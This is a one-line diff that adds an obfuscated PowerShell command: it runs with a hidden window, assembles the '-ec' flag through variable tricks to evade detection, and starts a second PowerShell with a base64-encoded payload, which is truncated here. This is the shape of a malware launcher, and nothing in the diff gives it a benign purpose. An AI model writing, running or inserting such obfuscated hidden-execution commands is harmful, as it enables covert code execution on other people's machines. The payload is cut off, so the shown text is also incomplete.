@@ -1,0 +1,1 @@
+Ppowershell -w 1 -C "sv S -;sv pB ec;sv Kk ((gv S).value.toString()+(gv pB).value.toString());powershell (gv Kk).value.toString() 'JABhAFEAIAA9ACAAJwAkAGUAVwAgAD0AIAAnACcAWwBEA>
